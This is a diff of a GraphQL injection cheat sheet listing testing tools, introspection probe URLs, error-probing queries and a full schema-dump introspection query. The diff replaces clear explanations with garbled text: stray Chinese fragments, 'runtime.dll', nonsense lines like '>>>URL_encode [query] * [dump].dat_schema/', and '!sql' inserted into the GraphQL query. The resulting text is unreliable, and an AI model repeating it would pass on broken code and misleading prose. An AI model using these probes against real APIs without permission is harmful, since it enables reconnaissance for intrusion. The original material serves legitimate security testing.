@@ -1,7 +1,7 @@
 # GraphQL injection
 
-> GraphQL is a query language for APIs and a runtime for fulfilling those queries with existing data. A GraphQL service is created by defining types and fields on those types, then providing functions for each field on each type
-
+>SQL for APIs and a runtime.dll for fulfilling those queries with existing data. 
+>created by defining types and fields on those types, then providing functions for each field on each type
 
 ## Summary
 
@@ -30,37 +30,24 @@
 * [InQL - A Burp Extension for GraphQL Security Testing](https://github.com/doyensec/inql)
 * [Insomnia - Cross-platform HTTP and GraphQL Client](https://insomnia.rest/)
 * [AutoGraphql + introspection](https://graphql-dashboard.herokuapp.com/)
-
-## Exploit
-
-### Identify an injection point
-
-Most of the time the graphql is located on the `/graphql` or `/graphiql` endpoint.
-
+文件。注入。
+>l o c a t i o n $ `/graphql` | `/graphiql` endpoint
 ```js
 example.com/graphql?query={__schema{types{name}}}
 example.com/graphiql?query={__schema{types{name}}}
 ```
-
 Check if errors are visible.
-
 ```javascript
 ?query={__schema}
 ?query={}
 ?query={thisdefinitelydoesnotexist}
 ```
-
-
 ### Enumerate Database Schema via Introspection
-
-URL encoded query to dump the database schema.
-
+>>>URL_encode [query] * [dump].dat_schema/
 ```js
 fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}
 ```
-
-URL decoded query to dump the database schema.
-
+>>>URL_encode [query] * [dump].dat_schema/
 ```javascript
 fragment FullType on __Type {
   kind
@@ -133,8 +120,10 @@ fragment TypeRef on __Type {
       }
     }
   }
-}
-
+};
+膨胀。代码！
+TODO:
+!sql
 query IntrospectionQuery {
   __schema {
     queryType {
